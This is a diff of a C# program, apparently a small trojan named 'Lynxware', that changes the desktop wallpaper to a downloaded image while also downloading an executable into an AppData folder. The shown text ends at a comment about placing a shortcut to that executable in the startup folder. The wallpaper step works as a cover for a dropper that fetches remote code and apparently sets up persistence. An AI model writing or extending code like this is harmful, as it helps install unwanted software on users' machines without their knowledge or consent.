@@ -1,43 +1,36 @@
 ﻿using System;
 using System.IO;
 using System.Net;
-using System.Reflection;
 using Microsoft.Win32;
 
-namespace WallpaperChanger
+namespace Lynxware
 {
-    class Program
+    class Lynxware
     {
         static void Main(string[] args)
         {
-            // Specify the URL of the photo you want to download
-            string photoUrl = "https://media.discordapp.net/attachments/1117274904744693781/1221250149108416582/image.png?ex=6611e4d5&is=65ff6fd5&hm=2582b1eb60d51d871cb60b0bd26d4f4c4958b9a7de4f42a54e39000a405fc9fa&=&format=webp&quality=lossless&width=1103&height=701";
-
-            // URL of the executable to download
-            string executableUrl = "https://example.com/yourapp.exe";
-
             // Directory to save the downloaded files
             string downloadDirectory = Path.Combine(
-                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynx");
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Lynxware");
 
             // Create the directory if it doesn't exist
             Directory.CreateDirectory(downloadDirectory);
 
             // Download the photo
-            string downloadedPhotoPath = Path.Combine(downloadDirectory, "wallpaper.jpg");
+            string downloadedPhotoPath = Path.Combine(downloadDirectory, "image.png");
             using (WebClient client = new WebClient())
             {
-                client.DownloadFile(photoUrl, downloadedPhotoPath);
+                client.DownloadFile(Dependencies.photoUrl, downloadedPhotoPath);
             }
 
             // Set the downloaded photo as the desktop background
             SetDesktopBackground(downloadedPhotoPath);
 
             // Download the executable
-            string downloadedExecutablePath = Path.Combine(downloadDirectory, "yourapp.exe");
+            string downloadedExecutablePath = Path.Combine(downloadDirectory, "Lynxware.exe");
             using (WebClient client = new WebClient())
             {
-                client.DownloadFile(executableUrl, downloadedExecutablePath);
+                client.DownloadFile(Dependencies.executableUrl, downloadedExecutablePath);
             }
 
             // Create a shortcut to the executable in the startup folder
